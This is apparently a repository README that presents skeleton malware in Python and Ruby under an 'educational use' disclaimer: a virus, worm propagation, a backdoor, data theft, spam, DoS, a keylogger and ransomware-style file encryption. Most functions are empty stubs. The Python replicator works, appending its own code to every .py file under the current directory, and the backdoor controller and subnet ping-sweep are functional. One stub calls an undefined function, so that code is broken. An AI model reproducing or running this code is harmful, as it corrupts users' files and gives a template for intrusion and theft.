# EthicalHacking_Viruses_Ransomware
Only intended for Educational Use

This repository contains code that shows the framework for various Malwares, and simple Trojans

# Virus Functionality Repository
# Viruses using Python

## Functionalities

***1. Basic Virus Structure***
This code demonstrates a basic virus structure, including how to replicate itself, how to hide itself from detection, and how to execute malicious code.

``` py
# Basic Virus Structure in Python
import os

def replicate():
    virus_code = open(__file__).read()
    target_files = []
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith('.py'):
                target_files.append(os.path.join(root, file))
    for file in target_files:
        with open(file, 'a') as f:
            f.write(virus_code)

def hide():
    pass # TODO: add code for hiding the virus

def execute():
    pass # TODO: add code for executing malicious code

if __name__ == '__main__':
    replicate()
    hide()
    execute()
```

***2. Network Propagation***
This code demonstrates how to propagate the virus over a network, using a worm-like technique. The virus scans the network for vulnerable machines and infects them automatically.

``` py
# Network Propagation in Python
import socket
import subprocess
import os

def scan_network():
    ip = socket.gethostbyname(socket.gethostname())
    ip_parts = ip.split('.')
    for i in range(1, 255):
        target_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
        if target_ip == ip:
            continue
        result = subprocess.call(['ping', '-n', '1', '-w', '500', target_ip])
        if result == 0:
            infect(target_ip)

def infect(target_ip):
    # TODO: add code for infecting the target machine
    pass

if __name__ == '__main__':
    scan_network()
```

***3. Remote Access***

This code demonstrates how to create a backdoor into a victim's computer, allowing remote access and control.

``` py
# Remote Access in Python
import socket
import subprocess
import os

def connect():
    s = socket.socket()
    s.bind(('0.0.0.0', 1234))
    s.listen(1)
    conn, addr = s.accept()
    print(f"Connection established with {addr[0]}")
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        if command == 'exit':
            break
        output = conn.recv(1024)
        print(output.decode())

def run_command(command):
    result = subprocess.check_output(command, shell=True)
    return result

if __name__ == '__main__':
    connect()
```

***4. Data Theft***
This code demonstrates how to steal sensitive data from a victim's computer, including passwords, credit card details, and other private information.

``` py
# Data Theft in Python
import os

def steal_passwords():
    # TODO: add code for stealing passwords
    pass

def steal_credit_cards():
    # TODO: add code for stealing credit card details
    pass

def steal_private_info():
    # TODO: add code for stealing private information
    pass

if __name__ == '__main__':
    steal_password
```

***5.Email Spamming***
This code demonstrates how to send spam emails from a victim's computer, using their email account and address book.

``` py
# Email Spamming in Python
import smtplib
import email.message
import os

def spam_emails():
    # TODO: add code for spamming emails
    pass

if __name__ == '__main__':
    spam_emails()
```

***6. Denial of Service (DoS) Attack***
This code demonstrates how to launch a DoS attack on a target website, rendering it inaccessible to users.

``` py

# DoS Attack in Python
import socket
import time
import os

def launch_dos_attack():
    # TODO: add code for launching DoS attack
    pass

if __name__ == '__main__':
    launch_dos_attack()

```
# Conclusion
The code and commands provided in this repository are for educational purposes only. They should not be used for any malicious purposes, as doing so is illegal and can result in severe legal consequences. The author of this repository is not responsible for any damage or harm caused by the use of this code or commands. Use at your own risk.

# Virus Repository using Ruby

***1. Keylogging***

``` ruby

# Keylogger in Ruby
require 'logger'
require 'win32/api'

LOG_FILE_NAME = 'keylog.txt'
LOG_DIRECTORY = 'C:/logs/'

def log_keys
  # TODO: add code for logging keys
end

if __FILE__ == $0
  log_keys
end

```

***2. Screen Logging***

``` ruby
# Screen Logger in Ruby
require 'logger'
require 'win32/screenshot'

LOG_FILE_NAME = 'screenlog.txt'
LOG_DIRECTORY = 'C:/logs/'

def log_screens
  # TODO: add code for logging screens
end

if __FILE__ == $0
  log_screens
end
```

***3. File Encryption***
This code demonstrates how to encrypt files on a victim's computer.

``` ruby
# File Encryption in Ruby
require 'openssl'

ENCRYPTION_ALGORITHM = 'AES-256-CBC'
KEY_FILE_NAME = 'key.bin'

def encrypt_file(file_path)
  # TODO: add code for encrypting file
end

def generate_key
  # TODO: add code for generating encryption key
end

if __FILE__ == $0
  file_path = ARGV[0]
  encrypt_file(file_path)
end

```

***4.Backdoor Creation***
This code demonstrates how to create a backdoor on a victim's computer, allowing remote access.

``` ruby

# Backdoor Creation in Ruby
require 'socket'

PORT = 1234

def create_backdoor
  # TODO: add code for creating backdoor
end

if __FILE__ == $0
  create_backdoor
end

```

***5. Email Spamming***
This code demonstrates how to send spam emails from a victim's computer, using their email account and address book.

``` ruby
# Email Spamming in Ruby
require 'net/smtp'
require 'mail'
require 'os'

def spam_emails
  # TODO: add code for spamming emails
end

if __FILE__ == $0
  spam_emails
end
```

***6. Denial of Service (DoS) Attack***
This code demonstrates how to launch a DoS attack on a target website, rendering it inaccessible to users.

``` ruby

# DoS Attack in Ruby
require 'socket'
require 'time'
require 'os'

def launch_dos_attack
  # TODO: add code for launching DoS attack
end

if __FILE__ == $0
  launch_dos_attack
end

```

## Disclaimer: 
The code and commands provided in this repository are for educational purposes only. The author of this repository does not condone or support the use of this code or commands for any malicious or harmful purposes. Any use of this code or commands for malicious or harmful purposes is strictly prohibited and illegal.
